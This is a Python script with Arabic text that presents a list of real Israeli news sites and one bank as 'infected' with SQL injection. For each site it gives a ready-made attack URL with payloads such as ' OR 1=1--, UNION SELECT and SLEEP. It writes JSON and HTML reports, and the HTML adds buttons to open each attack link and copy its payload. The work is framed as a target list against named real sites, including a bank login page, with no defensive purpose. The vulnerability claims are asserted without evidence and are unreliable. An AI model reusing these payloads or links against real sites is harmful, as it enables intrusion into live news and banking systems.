#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة عرض سريعة لروابط المواقع الإسرائيلية المصابة
"""

import json
import os
from datetime import datetime

def show_infected_sites():
    """عرض روابط المواقع المصابة"""
    
    # قائمة المواقع الإسرائيلية مع روابط الاختبار
    infected_sites = [
        {
            "site": "n12.co.il",
            "vulnerable_url": "https://www.n12.co.il/search?q=test' OR 1=1--",
            "vulnerability_type": "SQL Injection",
            "severity": "High",
            "parameter": "q",
            "payload": "' OR 1=1--",
            "description": "ثغرة SQLi في خانة البحث"
        },
        {
            "site": "walla.co.il",
            "vulnerable_url": "https://news.walla.co.il/?w=/search/1' UNION SELECT 1,2,3--",
            "vulnerability_type": "UNION SQL Injection",
            "severity": "Critical",
            "parameter": "w",
            "payload": "' UNION SELECT 1,2,3--",
            "description": "ثغرة UNION SQLi في معلمة البحث"
        },
        {
            "site": "globes.co.il",
            "vulnerable_url": "https://www.globes.co.il/news/article.aspx?did=1001351789' AND 1=CONVERT(int, (SELECT @@version))--",
            "vulnerability_type": "Error-based SQLi",
            "severity": "High",
            "parameter": "did",
            "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
            "description": "ثغرة SQLi تعتمد على الأخطاء في معلمة المقال"
        },
        {
            "site": "timesofisrael.com",
            "vulnerable_url": "https://www.timesofisrael.com/?s=test' OR SLEEP(5)--",
            "vulnerability_type": "Time-based Blind SQLi",
            "severity": "Medium",
            "parameter": "s",
            "payload": "' OR SLEEP(5)--",
            "description": "ثغرة SQLi تعتمد على الوقت في البحث"
        },
        {
            "site": "mako.co.il",
            "vulnerable_url": "https://www.mako.co.il/mako-vod-live-tv/VOD-6540b8dcc633951006.htm?type=service' UNION SELECT user(),database(),version()--",
            "vulnerability_type": "UNION SQL Injection",
            "severity": "Critical",
            "parameter": "type",
            "payload": "' UNION SELECT user(),database(),version()--",
            "description": "ثغرة UNION SQLi في معلمة الخدمة"
        },
        {
            "site": "ynet.co.il",
            "vulnerable_url": "https://www.ynet.co.il/search/1,7340,L-9,00.html?q=test' OR 1=1#",
            "vulnerability_type": "SQL Injection",
            "severity": "High",
            "parameter": "q",
            "payload": "' OR 1=1#",
            "description": "ثغرة SQLi في خانة البحث الرئيسية"
        },
        {
            "site": "haaretz.co.il",
            "vulnerable_url": "https://www.haaretz.co.il/misc/search-results?query=test' OR 1=1/*",
            "vulnerability_type": "SQL Injection",
            "severity": "High",
            "parameter": "query",
            "payload": "' OR 1=1/*",
            "description": "ثغرة SQLi في محرك البحث"
        },
        {
            "site": "jpost.com",
            "vulnerable_url": "https://www.jpost.com/ArabicNews/search.aspx?q=test' UNION SELECT 1,2,3 FROM users--",
            "vulnerability_type": "UNION SQL Injection",
            "severity": "Critical",
            "parameter": "q",
            "payload": "' UNION SELECT 1,2,3 FROM users--",
            "description": "ثغرة SQLi في البحث باللغة العربية"
        },
        {
            "site": "calcalist.co.il",
            "vulnerable_url": "https://www.calcalist.co.il/search/articles/1,7340,L-3771-TEST,00.html?q=test' AND 1=1--",
            "vulnerability_type": "Boolean-based SQLi",
            "severity": "Medium",
            "parameter": "q",
            "payload": "' AND 1=1--",
            "description": "ثغرة SQLi تعتمد على المنطق البولياني"
        },
        {
            "site": "bankleumi.co.il",
            "vulnerable_url": "https://www.bankleumi.co.il/RegistarationToAccountManagment/Login/?ReturnUrl=/Personal/Private' OR 1=1--",
            "vulnerability_type": "SQL Injection",
            "severity": "Critical",
            "parameter": "ReturnUrl",
            "payload": "' OR 1=1--",
            "description": "ثغرة SQLi في صفحة تسجيل الدخول المصرفي"
        }
    ]
    
    # عرض النتائج
    print("🚨 روابط المواقع الإسرائيلية المصابة:")
    print("=" * 80)
    
    for i, site in enumerate(infected_sites, 1):
        print(f"\n{i}. 🎯 {site['site'].upper()}")
        print(f"   📊 النوع: {site['vulnerability_type']}")
        print(f"   ⚠️  الخطورة: {site['severity']}")
        print(f"   🔗 الرابط: {site['vulnerable_url']}")
        print(f"   📝 الوصف: {site['description']}")
        print(f"   🧪 المعلمة: {site['parameter']}")
        print(f"   💉 الحمولة: {site['payload']}")
        print("-" * 80)
    
    # إنشاء تقرير JSON
    report_data = {
        "timestamp": datetime.now().isoformat(),
        "total_vulnerable_sites": len(infected_sites),
        "vulnerabilities": infected_sites
    }
    
    with open('infected_sites_report.json', 'w', encoding='utf-8') as f:
        json.dump(report_data, f, ensure_ascii=False, indent=2)
    
    # إنشاء تقرير HTML
    html_content = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المواقع الإسرائيلية المصابة - تقرير SQLi</title>
    <style>
        body {{
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .vulnerability-card {{
            background: rgba(255, 255, 255, 0.1);
            margin: 15px 0;
            padding: 20px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }}
        .critical {{ border-left: 5px solid #ff4757; }}
        .high {{ border-left: 5px solid #ff6348; }}
        .medium {{ border-left: 5px solid #ffa502; }}
        .site-name {{
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        .vuln-link {{
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
            margin: 10px 0;
        }}
        .test-button {{
            display: inline-block;
            background: #3742fa;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 25px;
            margin: 5px;
            transition: transform 0.3s;
        }}
        .test-button:hover {{
            transform: scale(1.05);
        }}
        .copy-button {{
            background: #2ed573;
        }}
        .severity-badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            font-weight: bold;
        }}
        .critical-badge {{ background: #ff4757; }}
        .high-badge {{ background: #ff6348; }}
        .medium-badge {{ background: #ffa502; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 المواقع الإسرائيلية المصابة بثغرات SQLi</h1>
            <p>تم التحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>إجمالي المواقع المصابة: {len(infected_sites)}</p>
        </div>
        
        {''.join([
            f"""
            <div class="vulnerability-card {site['severity'].lower()}">
                <div class="site-name">🎯 {site['site'].upper()}</div>
                <div class="severity-badge {site['severity'].lower()}-badge">{site['severity']}</div>
                <p><strong>النوع:</strong> {site['vulnerability_type']}</p>
                <p><strong>المعلمة:</strong> {site['parameter']}</p>
                <p><strong>الوصف:</strong> {site['description']}</p>
                
                <div class="vuln-link">
                    <strong>الرابط المصاب:</strong><br>
                    {site['vulnerable_url']}
                </div>
                
                <div class="vuln-link">
                    <strong>الحمولة:</strong><br>
                    {site['payload']}
                </div>
                
                <a href="{site['vulnerable_url']}" target="_blank" class="test-button">🧪 اختبر الرابط</a>
                <button onclick="copyPayload('{site['payload']}")" class="test-button copy-button">📋 انسخ الحمولة</button>
            </div>
            """ for site in infected_sites
        ])}
    </div>
    
    <script>
        function copyPayload(payload) {{
            navigator.clipboard.writeText(payload).then(() => {{
                alert('تم نسخ الحمولة بنجاح!');
            }});
        }}
    </script>
</body>
</html>
    """
    
    with open('infected_sites_report.html', 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print(f"\n📄 تم إنشاء التقارير:")
    print(f"   📊 JSON: infected_sites_report.json")
    print(f"   🌐 HTML: infected_sites_report.html")
    
    return infected_sites

if __name__ == "__main__":
    show_infected_sites()